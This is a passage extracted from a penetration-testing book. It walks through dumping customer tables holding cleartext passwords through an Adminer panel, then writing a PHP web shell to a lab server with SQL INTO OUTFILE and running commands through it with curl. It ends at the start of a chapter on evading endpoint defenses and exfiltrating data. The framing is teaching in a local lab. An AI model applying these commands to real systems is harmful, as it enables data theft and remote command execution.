@@ -1,0 +1,89 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 321 - Success! We’ve logged in to Adminer. You should see various databases, such as adminer_db, customers, sys, and mysql. In the next sections, we’ll use Adminer to dump database table data.
+Security Relevance Score: 14
+Word Count: 1163
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Success! We’ve logged in to Adminer. You should see various databases, such as adminer_db, customers, sys, and mysql. In the next sections, we’ll use Adminer to dump database table data.
+
+Dumping Sensitive Information
+We’ll use Adminer’s SQL interface to send SQL commands and export information from the tables in the customers database. Explore the tables that exist in the database by selecting Customers from the list (Figure 11-5).
+
+Figure 11-5: Tables in the customers database
+
+The database has two tables: acme_hyper_branding and acme_impact _alliance. Let’s run a few commands by using the SQL Command page in Adminer, found in the top-left menu:
+SELECT * FROM acme_hyper_branding;
+SELECT * FROM acme_impact_alliance;
+
+When you run these commands, two tables should appear that contain PII for two companies, including first names, last names, designations, emails, and cleartext credentials. Save this information to CSV or SQL by clicking Export, then choose a file format and click Export again. Listing 11-9 shows what a CSV export of the acme_hyper_branding table looks like.
+id,first_name,last_name,designation,email,password
+1,Jacob,Taylor,Founder,jtaylor@acme-hyper-branding.com,carmen
+2,Sarah,Lewish,Executive Assistant,slewis@acme-hyper-branding.com,cachepot
+--snip--
+6,Melissa,Rogers,Software Engineer,mrogers@acme-hyper-branding.com,melissa2go
+
+Listing 11-9: Table data containing sensitive information
+While we’ve accessed customer information, we haven’t yet completely compromised the database server.
+
+
+Uploading a Web Shell with SQL
+Can we upload a web shell by using SQL commands? MySQL has an INTO OUTFILE statement that writes results to an output file. Using a SELECT statement with INTO OUTFILE, we could try to write arbitrary contents to the database server’s filesystem.
+To be able to upload a web shell or write a file to the system, we first need to know whether the destination path we’re trying to write to exists on the system in the first place. The user account running the application must also have permission to write to the path.
+Let’s run a few test commands in the SQL Command section in Adminer to see if we can write to the system. The following SQL command attempts to add content to a file named file_write.txt:
+SELECT "test_write1" into OUTFILE "file_write1.txt"
+The execution succeeds, as indicated by the Query executed OK, 1 row affected response message, but we don’t know where this file exists on the filesystem. If we try browsing to http://localhost:8888/file_write1.txt, we get a 404 Not Found error. This means the file wasn’t saved in the web root directory, but somewhere else that we can’t browse to.
+Can we identify the filesystem path from which the site is served? Common web root paths include directories such as /var/wwwor /var/www/html. Run the following command to write the file into the /var/www/html directory:
+SELECT "test_write2" into OUTFILE "/var/www/html/file_write2.txt"
+This time, we get a permission-denied error, as indicated by the message Error in query (1): can't create/write to file, which means that the path exists but that the user executing the command on our behalf doesn’t have write access to it.
+Our dirsearch scan detected an uploads directory. Perhaps we can write to it? Let’s find out:
+SELECT "test_write3" into OUTFILE "/var/www/html/uploads/file_write3.txt"
+Browse to http://localhost:8888/uploads/file_write3.txt; you should see the test_write3 text, which indicates that we were able to write a file to the uploads directory.
+Now we need to write something that gives us the ability to execute commands. We can use a PHP web shell for this. Run the following commands to write a PHP web shell into the uploads directory:
+SELECT "<?php system($_GET['cmd']); ?>" into OUTFILE "/var/www/html/uploads/s.php"
+Finally, run curl to check whether we can execute commands by using the web shell:
+$ curl http://localhost:8888/uploads/s.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Success! We’re able to run system commands in the context of the www-data user. Before moving on, try establishing a reverse shell by using what you’ve learned so far in the book.
+
+
+
+Summary
+In this chapter, we improved our port scanning by using a frequency-enriched database of ports and identified possible access paths to additional assets on the corporate network. While moving laterally, we exploited scripts hosted on shared drives, breached unprotected databases, backdoored a WordPress instance, accessed a database administration panel through a leaked SQL file, performed Redis configuration tweaks, and uploaded a web shell by using SQL commands.
+
+
+
+
+
+
+
+
+
+
+
+
+12
+DEFENSE EVASION AND EXFILTRATION
+
+
+
+The actions you take against your target will inevitably leave traces. In this chapter, you’ll learn about the defense mechanisms commonly seen in production environments, as well as methods you can use to extract data from systems without detection. You’ll explore ways of concealing malicious processes and commands, disabling security tools, encrypting and encoding data, and exfiltrating sensitive information.
+
+Defensive Controls
+You could come across many types of security controls during a penetration test. Most defensive tools deployed on endpoints are hard to detect when you’re attacking a host from a black box perspective, and you won’t know they exist until you’ve compromised the host. Exceptions to this exist, however. For example, if an agent takes actions when attacked, such as blocking the attacker, you may be able to tell that the host is self-protecting.
+The defensive security space is vast, so covering every possible tool you could encounter would likely require a book of its own. However, the following sections discuss key control types in more detail.
+
+Endpoint Security
+Endpoint security technologies aim to provide telemetry to defenders, identify anomalous activity on servers, and (ideally) prevent attackers from succeeding. Production environments may use tools like the following:
+Extended detection and response
+Also called endpoint detection and response (EDR) when focused only on endpoints, extended detection and response (XDR) solutions attempt to collect data from anything that can emit log events, such as servers, firewalls, cloud services, and inbound and outbound email. XDR solutions correlate the collected data to give defenders an understanding of interesting events happening on the network and stitch together a story about malicious operations moving laterally. On servers, EDR and XDR solutions typically implement software agents that collect information and prevent malicious software from running based on various types of heuristics. They also provide defenders with the ability to send commands to the monitored hosts and respond to incidents.
+Data loss prevention
+Data loss prevention (DLP) systems classify data at rest and in transit, then take measures to prevent data exfiltration based on policies predefined by the system’s owner. DLP systems can work at the host and network levels, such as by monitoring traffic going out of a system or by monitoring emails sent from an organization. Their goal is to ensure that sensitive data doesn’t leave an organization’s boundaries unless authorized.
+Traditional antivirus systems
+Often used for compliance reasons, traditional antivirus solutions are still alive and kicking. These tools, such as ClamAV for Linux, scan filesystems for known malicious file hashes and quarantine files that have matching hashes. They rely on the existence of up-to-date hash databases to identify modern threats. Today, most signature-based antivirus scanning exists as modules in EDR and XDR solutions.
+File integrity monitoring
+File integrity monitoring (FIM) systems monitor sensitive filesystem paths for changes such as file writes or deletes, then prevent unauthorized modifications. For example, in
